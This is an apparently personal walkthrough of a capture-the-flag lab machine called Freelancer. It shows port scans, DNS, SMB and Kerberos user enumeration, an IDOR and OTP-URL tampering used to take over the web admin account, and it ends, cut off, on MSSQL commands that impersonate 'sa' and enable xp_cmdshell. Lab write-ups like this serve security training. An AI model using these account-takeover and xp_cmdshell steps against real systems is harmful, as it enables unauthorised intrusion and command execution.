# Initial Enumeration

As usual we are provided a single entry point IP from the challenge: **10.10.11.5**

But we are provided the main OS used as well which is supposedly being Windows?

![c1d34a102b04d16c120511b3aa47061a.png](../../../_resources/c1d34a102b04d16c120511b3aa47061a.png)

Without further do, let's start by checking all the available open services on the TCP protocol.

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 nginx 1.25.5
|_http-server-header: nginx/1.25.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://freelancer.htb/
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-04 12:30:37Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55297/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.5\SQLEXPRESS: 
|     Target_Name: FREELANCER
|     NetBIOS_Domain_Name: FREELANCER
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: freelancer.htb
|     DNS_Computer_Name: DC.freelancer.htb
|     DNS_Tree_Name: freelancer.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-06-04T12:31:40+00:00; +5h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-04T02:47:37
| Not valid after:  2054-06-04T02:47:37
| MD5:   4195:cdde:7a8c:70a0:59cb:a4cb:6004:e736
| SHA-1: ed21:615f:6195:dae7:e1a5:82c0:63b1:a60c:df4a:e373
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQH5PybW6xHKRMKbYxtSXKDDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjQwNjA0MDI0NzM3WhgPMjA1NDA2MDQwMjQ3MzdaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMdB8pLt
| JdxUKan3X9VDtvBMiYLS9+hx2mqLFqH0Fjea6PBlLDzuYvsH2WTCrLYQohsKKwWw
| KZmwxOpMhnOvdBc7hq6rFEkrOdr7ah+KxUAbwkHiaqaC62WUiwCURpuj5/IrsUTc
| 88nyvG3Cu7jQDBm5uoC6Dq9WrSqVBBChVmuoU+qv1HJfVi5iQIX1mKTCXDJ4k7pI
| 70QG9FEYr6cdb+sf9IMQg+2yYTWfY/N5SQnECneVXCJCXLl3lSh7Waf+XbyMPJDJ
| hKz0786GscOOqmBMdMStA8hWZekQ/TC097fiZCTNs+zfRutOd3dxMuz7xTkbajGd
| uFLSOpxuEZGt/hECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAmHInSzkUdTCpz6Aj
| fSkm6dltBPhnguTXC/MtMb8VypY1bB4Ihh9zC8RaLOYMQa4HMO5xOH87hHmw72Al
| CzQvP1ScFMr6cLaG0WbPkmZNXr2UgeuYLTAYSB7tWWgHTfOoNCug1yiQPgNXnYjD
| zwrFo6ZxGFWidm0YdWPSOIU+kHd1cgHYnYuDyldb4Ar93neAmOzD37RDVmfBkdMB
| BCiJTG0Xb1Tq1OEA0B3J3va/oviBjNv1fU2rjUH9k/+8lmm+rtrn07VcVn1SlQ3f
| m5dd3vB4vAIxgX2y5mGYdJiCVQwjBLLl1NxAWg2ycxuWkb7JXYGqiNyvwiIctG0V
| hjASYA==
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   10.10.11.5\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 55297
|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query
|_    Clustered: false
65078/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65082/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=6/4%OT=53%CT=%CU=30436%PV=Y%DS=2%DC=T%G=N%TM=665EC2DC%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-04T12:31:35
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53827/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 56435/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55524/udp): CLEAN (Failed to receive data)
|   Check 4 (port 39076/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   34.33 ms 10.10.14.1
2   34.72 ms 10.10.11.5

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:31
Completed NSE at 09:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:31
Completed NSE at 09:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:31
Completed NSE at 09:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.16 seconds
           Raw packets sent: 73 (4.616KB) | Rcvd: 70 (4.216KB)
```

And what about UDP instead?

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Freelancer]
└─# nmap -sU -F 10.10.11.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-04 09:35 CEST
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 44.38% done; ETC: 09:37 (0:00:55 remaining)
Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 47.50% done; ETC: 09:37 (0:01:00 remaining)
Stats: 0:02:57 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 93.12% done; ETC: 09:38 (0:00:13 remaining)
Nmap scan report for 10.10.11.5
Host is up (0.038s latency).
Not shown: 75 closed udp ports (port-unreach)
PORT      STATE         SERVICE
53/udp    open          domain                                                                                                                                                                                                                               
88/udp    open          kerberos-sec                                                                                                                                                                                                                         
123/udp   open          ntp                                                                                                                                                                                                                                  
137/udp   open|filtered netbios-ns                                                                                                                                                                                                                           
138/udp   open|filtered netbios-dgm                                                                                                                                                                                                                          
500/udp   open|filtered isakmp                                                                                                                                                                                                                               
1434/udp  open|filtered ms-sql-m                                                                                                                                                                                                                             
4500/udp  open|filtered nat-t-ike                                                                                                                                                                                                                            
5353/udp  open|filtered zeroconf                                                                                                                                                                                                                             
49152/udp open|filtered unknown                                                                                                                                                                                                                              
49153/udp open|filtered unknown                                                                                                                                                                                                                              
49154/udp open|filtered unknown                                                                                                                                                                                                                              
49156/udp open|filtered unknown                                                                                                                                                                                                                              
49181/udp open|filtered unknown                                                                                                                                                                                                                              
49182/udp open|filtered unknown                                                                                                                                                                                                                              
49185/udp open|filtered unknown                                                                                                                                                                                                                              
49186/udp open|filtered unknown                                                                                                                                                                                                                              
49188/udp open|filtered unknown                                                                                                                                                                                                                              
49190/udp open|filtered unknown                                                                                                                                                                                                                              
49191/udp open|filtered unknown                                                                                                                                                                                                                              
49192/udp open|filtered unknown                                                                                                                                                                                                                              
49193/udp open|filtered unknown                                                                                                                                                                                                                              
49194/udp open|filtered unknown                                                                                                                                                                                                                              
49200/udp open|filtered unknown                                                                                                                                                                                                                              
49201/udp open|filtered unknown                                                                                                                                                                                                                              

Nmap done: 1 IP address (1 host up) scanned in 229.52 seconds
```

Ok, let's move on to manual enumeration of every service found in this list.

&nbsp;

# DNS

&nbsp;We can start by enumerating if we can get any record whatsoever?

&nbsp;![b65c2665cce6a824b8402b1d677a4ec7.png](../../../_resources/b65c2665cce6a824b8402b1d677a4ec7.png)

Not much, and what about a zone transfer?

![c6fb7f18431ad3cbc3f3895a93273b73.png](../../../_resources/c6fb7f18431ad3cbc3f3895a93273b73.png)

Not much, but can we perform a subdomain brute forcing?

```
└─# dnsenum --dnsserver 10.10.11.5 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt freelancer.htb
dnsenum VERSION:1.3.1                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                             
-----   freelancer.htb   -----                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
Host's addresses:                                                                                                                                                                                                                                            
__________________                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                                             
freelancer.htb.                          600      IN    A        10.10.11.5                                                                                                                                                                                  
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
Name Servers:                                                                                                                                                                                                                                                
______________                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                             
dc.freelancer.htb.                       3600     IN    A        10.10.11.5                                                                                                                                                                                  
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
Mail (MX) Servers:                                                                                                                                                                                                                                           
___________________                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
Trying Zone Transfers and getting Bind Versions:                                                                                                                                                                                                             
_________________________________________________                                                                                                                                                                                                            
                                                                                                                                                                                                                                                             
unresolvable name: dc.freelancer.htb at /usr/bin/dnsenum line 892 thread 1.                                                                                                                                                                                  

Trying Zone Transfer for freelancer.htb on dc.freelancer.htb ... 
AXFR record query failed: no nameservers

                                                                                                                                                                                                                                                             
Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:                                                                                                                                                                       
_______________________________________________________________________________________                                                                                                                                                                      
                                                                                                                                                                                                                                                             
dc.freelancer.htb.                       3600     IN    A        10.10.11.5                                                                                                                                                                                  
gc._msdcs.freelancer.htb.                600      IN    A        10.10.11.5
domaindnszones.freelancer.htb.           600      IN    A        10.10.11.5
forestdnszones.freelancer.htb.           600      IN    A        10.10.11.5

                                                                                                                                                                                                                                                             
Launching Whois Queries:                                                                                                                                                                                                                                     
_________________________                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
freelancer.htb______________                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
Performing reverse lookup on 0 ip addresses:                                                                                                                                                                                                                 
_____________________________________________                                                                                                                                                                                                                
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
0 results out of 0 IP addresses.

                                                                                                                                                                                                                                                             
freelancer.htb ip blocks:                                                                                                                                                                                                                                    
__________________________                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                             
done.
```

Not much relevant is here, I guess we can move on since nothing else is relevant here.

&nbsp;

# SAMBA

We can use enum4linux-ng to check if we can find something juicy inside here.

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Freelancer]
└─# enum4linux-ng -A freelancer.htb
/usr/local/bin/enum4linux-ng:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('enum4linux-ng==1.3.2', 'enum4linux-ng')
ENUM4LINUX - next generation (v1.3.2)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... freelancer.htb
[*] Username ......... ''
[*] Random Username .. 'hqrkrqqb'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on freelancer.htb    |
 =======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ======================================================
|    Domain Information via LDAP for freelancer.htb    |
 ======================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: freelancer.htb

 =============================================================
|    NetBIOS Names and Workgroup/Domain for freelancer.htb    |
 =============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ===========================================
|    SMB Dialect Check on freelancer.htb    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 =============================================================
|    Domain Information via SMB session for freelancer.htb    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: FREELANCER
DNS domain: freelancer.htb
FQDN: DC.freelancer.htb
Derived membership: domain member
Derived domain: FREELANCER                                                                                                                                                                                                                                   

 ===========================================
|    RPC Session Check on freelancer.htb    |
 ===========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =====================================================
|    Domain Information via RPC for freelancer.htb    |
 =====================================================
[+] Domain: FREELANCER
[+] Domain SID: S-1-5-21-3542429192-2036945976-3483670807
[+] Membership: domain member

 =================================================
|    OS Information via RPC for freelancer.htb    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                                     
OS version: '10.0'                                                                                                                                                                                                                                           
OS release: '1809'                                                                                                                                                                                                                                           
OS build: '17763'                                                                                                                                                                                                                                            
Native OS: not supported                                                                                                                                                                                                                                     
Native LAN manager: not supported                                                                                                                                                                                                                            
Platform id: null                                                                                                                                                                                                                                            
Server type: null                                                                                                                                                                                                                                            
Server type string: null                                                                                                                                                                                                                                     

 =======================================
|    Users via RPC on freelancer.htb    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ========================================
|    Groups via RPC on freelancer.htb    |
 ========================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ========================================
|    Shares via RPC on freelancer.htb    |
 ========================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ===========================================
|    Policies via RPC for freelancer.htb    |
 ===========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ===========================================
|    Printers via RPC for freelancer.htb    |
 ===========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 11.87 seconds
```

Nothing interesting so far, but can wee see any share diguised as anonymous user instead?

![1b0758665591e59993ea2dd368b0f415.png](../../../_resources/1b0758665591e59993ea2dd368b0f415.png)

Nah, so we can move on for now!

&nbsp;

# KERBEROS

I will start by fuzzing thru the kerberos for available usernames.

And we can start by using jsmith.txt first!

```
msf6 auxiliary(gather/kerberos_enumusers) > run

[*] Using domain: FREELANCER.HTB - freelancer.htb:88    ...
[+] 10.10.11.5 - User: "jmartinez" is present
[+] 10.10.11.5 - User: "sdavis" is present
[+] 10.10.11.5 - User: "dthomas" is present
[+] 10.10.11.5 - User: "jgreen" is present
[+] 10.10.11.5 - User: "hking" is present
[+] 10.10.11.5 - User: "wwalker" is present
[+] 10.10.11.5 - User: "ereed" is present
```

And what about just john.txt instead?

x

x

&nbsp;

# HTTP

I will start by checking the presence of other possible subdomains?

![71ef7b34f4bae0f7c1e7137e921a8ea3.png](../../../_resources/71ef7b34f4bae0f7c1e7137e921a8ea3.png)

&nbsp;The throttling is so heavy so i might consider stopping the search of new domains... But nothing came out so far, so let's concentrate on possible hidden files on this site?

But seems like still a lot of junk and nothing juicy.

![af895d4af38e33c072c7cadb98cd862a.png](../../../_resources/af895d4af38e33c072c7cadb98cd862a.png)

Moving along seems like we are in front of a HR/Jobboard site?

![e57bdabc312a095b8b1af5267f60df09.png](../../../_resources/e57bdabc312a095b8b1af5267f60df09.png)

Trying to catch the login request we can see the CSRF token which might lead to unsuccessfull SLQi over the login portal.

![8b2c98d057f6f7b7dfe048324ac40827.png](../../../_resources/8b2c98d057f6f7b7dfe048324ac40827.png)

I guess we can move on for now... Next idea is to check the blog for SQLi?

![f7b81b41fccb41054d2ccab15c9413c0.png](../../../_resources/f7b81b41fccb41054d2ccab15c9413c0.png)

But seems like it fails?

![2b83a4704e253f043d232946864e8485.png](../../../_resources/2b83a4704e253f043d232946864e8485.png)

Next is checking the contact function and it seems working?  
![23ca6459c3c93e0dffc117cec1740225.png](../../../_resources/23ca6459c3c93e0dffc117cec1740225.png)

But usure if I need to do something else. So I will procede by creating both a candidate and employee type of accound and move of from there!

![d9351bf49ff8a88ddc5ec439e3945ca1.png](../../../_resources/d9351bf49ff8a88ddc5ec439e3945ca1.png)

If I want to post a job i need an employeer type account...

![ffbc512c9885f6333be65618baf2ea65.png](../../../_resources/ffbc512c9885f6333be65618baf2ea65.png)

So here I checked the forum and seems like we need to find the id of a juicy account so looking around seems like we can get the user list from a blog article.

![86e5bab142dfff710b9bbf10ec5830bc.png](../../../_resources/86e5bab142dfff710b9bbf10ec5830bc.png)

And clicking on a user name we have a IDOOR:

![c99ed42b29157344a25ce0e0001d71aa.png](../../../_resources/c99ed42b29157344a25ce0e0001d71aa.png)

Seems the ADMIN of the portal is on the id 2?

```
http://freelancer.htb/accounts/profile/visit/2/
```

I think we want to get admins cookie so we can access the admin profile via /admin/?

![90eaaba772490f0ba535069ccecdf3ad.png](../../../_resources/90eaaba772490f0ba535069ccecdf3ad.png)

Now from what I understand we need to recover the user credentials via the password recovery function, so let's start with out one!

![a18de2185cf8416403f2f7c343d3382a.png](../../../_resources/a18de2185cf8416403f2f7c343d3382a.png)

![7aaff025270e8acee09a5dd964ac267e.png](../../../_resources/7aaff025270e8acee09a5dd964ac267e.png)

If we do a reset we can see that the id is B64 encoded before performing a password reset.

![1e81b288413300e2e9854fe0f67d2cc3.png](../../../_resources/1e81b288413300e2e9854fe0f67d2cc3.png)

I wonder if we can find the admin id to perform a password reset instead?

And seems like we can use the password set based on knowing how the id looks like?

![cd2a104fbe925101b7398b6bd96f5245.png](../../../_resources/cd2a104fbe925101b7398b6bd96f5245.png)

Basically this allowed me to reset my password.

![504174520397019f744893286cafbebb.png](../../../_resources/504174520397019f744893286cafbebb.png)

So my idea is to create a user id list since we know our id is 10012. And perform a password reset of the id!

![72d0a853f9f37b24af065bc6ecdbf966.png](../../../_resources/72d0a853f9f37b24af065bc6ecdbf966.png)

But first we need to find the right ID somewhere? If my theory is right this means that our id is 10012?

![bd42d1a0b45b47a99db5c7282d378351.png](../../../_resources/bd42d1a0b45b47a99db5c7282d378351.png)

Gucci! Then we know the admin is is 2 and it have to be B64 encoded only?

```
Mg==
```

Can we now reset it's password?

![67141957881a8d237ce0cd3f4b0dcf6a.png](../../../_resources/67141957881a8d237ce0cd3f4b0dcf6a.png)

We are getting error which means that we might need to be faster?

Seems like no, we get error anyway so I got the tips to try to login as Employee instead, but it says that account isn't active so I got the tips to try to password reset it!

![993fbdfc62d27dfcfe5dd69e5f1fc49c.png](../../../_resources/993fbdfc62d27dfcfe5dd69e5f1fc49c.png)

After performing a Employee password reset we can login!

![f0d10cdf4d610f88b1c07a31cb76bee8.png](../../../_resources/f0d10cdf4d610f88b1c07a31cb76bee8.png)

What is juicy here is the opt token(qr):

![8af40b0ce1edee9aeb0f5cb65dfa7e65.png](../../../_resources/8af40b0ce1edee9aeb0f5cb65dfa7e65.png)

if we scan it via mobile.. We can get the QR code url:

![480870c5c8fec4528c827ac1dc080061.png](../../../_resources/480870c5c8fec4528c827ac1dc080061.png)

```
http://freelancer.htb/accounts/login/otp/MTAwMTY=/fa9bb2f1e211c961385fd5fd3809fba7/
```

I am wondering if we can just tamper the admin profile by changing the url to match the id 2=Mg==?

![84730d0176f86047c175a474e6a49a45.png](../../../_resources/84730d0176f86047c175a474e6a49a45.png)

Seems like we are getting a issue? This means we need to be fast?

![e3effdf13a1575237bb53e2c6df64202.png](../../../_resources/e3effdf13a1575237bb53e2c6df64202.png)

Nice so let's change it's password now to secure persistence! But it isn't even needed cause the same cookie is used to login into /admin/

![f9e01155d2a1be73e99d6f620504102b.png](../../../_resources/f9e01155d2a1be73e99d6f620504102b.png)

I see a SQL terminal:

![857620d2eecac2e2fc2a082d7ffcc25a.png](../../../_resources/857620d2eecac2e2fc2a082d7ffcc25a.png)

Indeed now it works and we can execute commands, like whoami:

![163605749aeeb6999b9e00e0dea53792.png](../../../_resources/163605749aeeb6999b9e00e0dea53792.png)

The list of DB:

![40b98b2026730ae894f3d6e2af06d6c6.png](../../../_resources/40b98b2026730ae894f3d6e2af06d6c6.png)

Can we exfiltrate the users maybe?

![62d226a2d23456ba21819300bfda5bad.png](../../../_resources/62d226a2d23456ba21819300bfda5bad.png)

I don't see juicy tables so far :/ But checking from Admin log we can see that there is the id of the admin username we have so far:

![6fd48e4ef432c46f58a804de15b27ba9.png](../../../_resources/6fd48e4ef432c46f58a804de15b27ba9.png)

My idea is to catch the request and parse it via SQLMap for an easier enumeration?

![d94715ac4a577b73d17385379b81f39b.png](../../../_resources/d94715ac4a577b73d17385379b81f39b.png)

Next i will try to check if I can read files via "OPENROWSET" function? But it isn't available...

![fb8bf731afe5a7367a12145d7a7bf77c.png](../../../_resources/fb8bf731afe5a7367a12145d7a7bf77c.png)

Next I want to check for possible remote linked servers maybe? Seems like no!

![b769262fbbc97192dd85b2ae1f36e60c.png](../../../_resources/b769262fbbc97192dd85b2ae1f36e60c.png)

Next I want to check if I can impersonate somehow maybe?

![fc1354043b8b4f548478a70c00affaab.png](../../../_resources/fc1354043b8b4f548478a70c00affaab.png)

DAMN! I see a possible impersonation as SA?

![ace56e144ca0c5a215440c3a8cde945d.png](../../../_resources/ace56e144ca0c5a215440c3a8cde945d.png)

This should be enough to impersonate as SA? But I can't get back a verbose so I will try to get a RCE in a one shot anyway.Sin

![b27b25b74fd8a941a86d397013bb2c10.png](../../../_resources/b27b25b74fd8a941a86d397013bb2c10.png)

I might just try to get the RCE in one shot!

```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXEC SP_CONFIGURE 'show advanced options',1
reconfigure
EXEC SP_CONFIGURE 'xp_cmdshell',1
reconfigure
